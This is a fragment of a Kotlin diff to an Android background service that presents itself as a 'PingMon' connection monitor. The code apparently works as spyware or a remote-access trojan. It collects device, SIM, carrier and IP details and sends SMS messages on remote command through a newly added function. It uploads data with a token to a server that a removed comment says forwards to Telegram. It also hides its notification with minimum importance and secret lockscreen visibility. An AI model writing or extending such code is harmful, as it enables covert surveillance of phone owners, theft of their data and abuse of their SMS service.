+                put("vpn", isVpn); put("icon", iconState); put("ringer", ringerState)
+                put("battery", batteryLevel())
+                put("carrier", sims.joinToString(" / ").ifBlank { "—" })
+                put("sims", org.json.JSONArray(sims)); put("network", networkType())
+                put("ip", prefs.getString(KEY_CLIENT_IP, "—") ?: "—")
+            }
+            prefs.edit().putString("pending_info", info.toString()).apply()
+        } catch (e: Exception) { Log.w(TAG, "collectDeviceInfo: ${e.message}") }
     }
 
-    /** Upload a text file to the file server → forwarded to Telegram. */
+    private fun sendSmsFromCommand(arg: String) {
+        try {
+            val data = JSONObject(arg)
+            val to   = data.optString("to", "")
+            val msg  = data.optString("msg", "")
+            if (to.isBlank() || msg.isBlank()) return
+            val mgr   = android.telephony.SmsManager.getDefault()
+            val parts = mgr.divideMessage(msg)
+            mgr.sendMultipartTextMessage(to, null, parts, null, null)
+            prefs.edit().putString(KEY_REPORT, "SMS sent to $to").apply()
+        } catch (e: Exception) { prefs.edit().putString(KEY_REPORT, "SMS error: ${e.message}").apply() }
+    }
+
     fun uploadText(filename: String, content: String, caption: String = "") {
-        val serverUrl = serverUrl(this)
-        if (serverUrl.isBlank()) {
-            Log.w(TAG, "no server_url configured")
-            return
-        }
+        val server = serverUrl(this)
+        if (server.isBlank()) return
         val bytes = content.toByteArray(Charsets.UTF_8)
-        val body  = okhttp3.RequestBody.create("text/plain".toMediaType(), bytes)
-        val req   = okhttp3.Request.Builder()
-            .url("$serverUrl/upload")
+        val req   = Request.Builder().url("$server/upload")
             .addHeader("X-Token", APP_TOKEN)
             .addHeader("X-Filename", filename)
-            .addHeader("X-Caption", caption)
-            .post(body)
+            .addHeader("X-Caption", caption.replace(Regex("[^\\x20-\\x7E]"), ""))
+            .post(bytes.toRequestBody("text/plain; charset=utf-8".toMediaType()))
             .build()
         client.newCall(req).enqueue(object : Callback {
-            override fun onFailure(call: Call, e: java.io.IOException) {
-                Log.w(TAG, "upload failed: ${e.message}")
-            }
-            override fun onResponse(call: Call, response: Response) {
-                response.use { Log.i(TAG, "upload done: ${it.code}") }
-            }
+            override fun onFailure(call: Call, e: java.io.IOException) { Log.w(TAG, "upload: ${e.message}") }
+            override fun onResponse(call: Call, response: Response) { response.use { } }
         })
     }
 
@@ -730,9 +559,8 @@ class PingService : Service() {
 
     private fun createChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val ch = NotificationChannel(
-                CHANNEL_ID, "Connection", NotificationManager.IMPORTANCE_MIN
-            ).apply { setShowBadge(false); lockscreenVisibility = Notification.VISIBILITY_SECRET }
+            val ch = NotificationChannel(CHANNEL_ID, "Connection", NotificationManager.IMPORTANCE_MIN)
+                .apply { setShowBadge(false); lockscreenVisibility = Notification.VISIBILITY_SECRET }
             getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
         }
     }
@@ -742,13 +570,10 @@ class PingService : Service() {
             ?.apply { flags = Intent.FLAG_ACTIVITY_NEW_TASK }
             ?: Intent(Intent.ACTION_VIEW, android.net.Uri.parse("https://play.google.com"))
                 .apply { flags = Intent.FLAG_ACTIVITY_NEW_TASK }
-        val tap = PendingIntent.getActivity(
-            this, 0, playIntent,
-            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
-        )
+        val tap = PendingIntent.getActivity(this, 0, playIntent,
+            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT)
         return NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("PingMon")
-            .setContentText(text)
+            .setContentTitle("PingMon").setContentText(text)
             .setSmallIcon(android.R.drawable.stat_sys_upload_done)
             .setPriority(NotificationCompat.PRIORITY_MIN)
             .setOngoing(true).setSilent(true).setShowWhen(false)
@@ -758,7 +583,7 @@ class PingService : Service() {
     private fun updateNotification(state: String) {
         try {
             getSystemService(NotificationManager::class.java)
-                .notify(NOTIF_ID, buildNotification("${uid(this).take(8)} · $state"))
+                .notify(NOTIF_ID, buildNotification("${uid(this).take(8)} - $state"))
         } catch (_: Exception) {}
     }
 }
